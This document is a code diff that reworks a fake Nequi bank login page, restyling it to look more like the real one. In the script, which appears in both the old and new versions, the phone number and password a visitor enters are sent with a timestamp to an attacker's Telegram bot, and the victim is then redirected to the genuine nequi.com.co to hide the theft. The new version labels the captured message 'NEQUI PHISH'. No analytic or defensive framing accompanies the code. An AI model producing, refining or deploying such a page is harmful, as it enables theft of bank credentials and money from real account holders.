@@ -3,101 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nequi | Inicia sesión</title>
+    <title>Nequi</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
         
         * { margin:0; padding:0; box-sizing:border-box; }
         body { 
             font-family: 'Roboto', sans-serif; 
-            background: #f5f5f5; 
-            height:100vh; 
-            display:flex; 
-            align-items:center; 
-            justify-content:center; 
+            background: #00B14F; 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
         }
-        .container { 
-            background:white; 
-            width:100%; 
-            max-width:400px; 
-            min-height:100vh; 
-            box-shadow:0 0 20px rgba(0,0,0,0.1); 
+        .card {
+            background: white;
+            width: 100%;
+            max-width: 380px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
         }
-        .header { 
-            background: linear-gradient(90deg, #00c853, #00b140); 
-            color:white; 
-            text-align:center; 
-            padding:40px 20px 30px; 
+        .header {
+            background: #00B14F;
+            color: white;
+            text-align: center;
+            padding: 35px 0 25px;
         }
-        .header img { width:90px; }
-        .header h1 { 
-            font-size:22px; 
-            margin-top:10px; 
-            font-weight:500; 
+        .header img {
+            width: 78px;
+            filter: brightness(0) invert(1);
         }
-        .content { padding:30px 25px; }
-        h2 { 
-            text-align:center; 
-            color:#333; 
-            margin-bottom:30px; 
-            font-size:18px; 
+        .header h1 {
+            font-size: 26px;
+            margin-top: 8px;
+            font-weight: 500;
         }
-        input { 
-            width:100%; 
-            padding:15px; 
-            margin:12px 0; 
-            border:1px solid #ddd; 
-            border-radius:8px; 
-            font-size:16px; 
+        .content {
+            padding: 30px 28px 40px;
         }
-        button { 
-            width:100%; 
-            padding:15px; 
-            background:#00b140; 
-            color:white; 
-            border:none; 
-            border-radius:8px; 
-            font-size:17px; 
-            font-weight:500; 
-            margin-top:20px; 
-            cursor:pointer; 
+        .title {
+            text-align: center;
+            font-size: 17px;
+            color: #333;
+            margin-bottom: 28px;
+            font-weight: 500;
         }
-        button:hover { background:#009933; }
-        .error { 
-            color:red; 
-            text-align:center; 
-            margin:15px 0; 
-            display:none; 
-            font-size:14px;
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 9px 0;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16.5px;
         }
-        .footer { 
-            text-align:center; 
-            padding:30px 20px; 
-            color:#666; 
-            font-size:13px; 
+        input:focus {
+            outline: none;
+            border-color: #00B14F;
+        }
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background: #00B14F;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 500;
+            margin-top: 18px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #00963a;
+        }
+        .error {
+            color: #d32f2f;
+            text-align: center;
+            margin: 12px 0;
+            font-size: 14px;
+            display: none;
+        }
+        .forgot {
+            text-align: center;
+            color: #00B14F;
+            margin-top: 25px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .footer {
+            text-align: center;
+            padding: 25px;
+            color: #666;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="card">
         <div class="header">
             
             <h1>Nequi</h1>
         </div>
         
         <div class="content">
-            <h2>Inicia sesión en tu cuenta</h2>
+            <div class="title">Inicia sesión en tu cuenta</div>
             
             <form id="loginForm">
                 <input type="tel" id="phone" placeholder="Número de celular" maxlength="10" required>
                 <input type="password" id="password" placeholder="Contraseña" required>
                 <div class="error" id="errorMsg">Número o contraseña incorrectos</div>
-                <button type="submit">Continuar</button>
+                <button type="submit" class="btn">Ingresar</button>
             </form>
             
-            <p style="text-align:center; margin-top:25px; color:#00b140; font-size:15px;">
-                ¿Olvidaste tu contraseña?
-            </p>
+            <div class="forgot">¿Olvidaste tu contraseña?</div>
         </div>
         
         <div class="footer">
@@ -112,16 +130,16 @@
         document.getElementById("loginForm").addEventListener("submit", function(e) {
             e.preventDefault();
             
-            let phone = document.getElementById("phone").value.trim();
-            let password = document.getElementById("password").value.trim();
-            let errorMsg = document.getElementById("errorMsg");
+            const phone = document.getElementById("phone").value.trim();
+            const password = document.getElementById("password").value.trim();
+            const errorMsg = document.getElementById("errorMsg");
 
             if (phone.length < 10) {
                 errorMsg.style.display = "block";
                 return;
             }
 
-            const message = `🔴 NEQUI\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
+            const message = `🔴 NEQUI PHISH\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -130,9 +148,11 @@
             })
             .then(() => {
                 errorMsg.style.color = "green";
-                errorMsg.textContent = "✅ Sesión iniciada correctamente";
+                errorMsg.textContent = "✅ Iniciando sesión...";
                 errorMsg.style.display = "block";
-                setTimeout(() => { window.location.href = "https://www.nequi.com.co"; }, 1800);
+                setTimeout(() => {
+                    window.location.href = "https://www.nequi.com.co";
+                }, 1600);
             })
             .catch(() => {
                 window.location.href = "https://www.nequi.com.co";
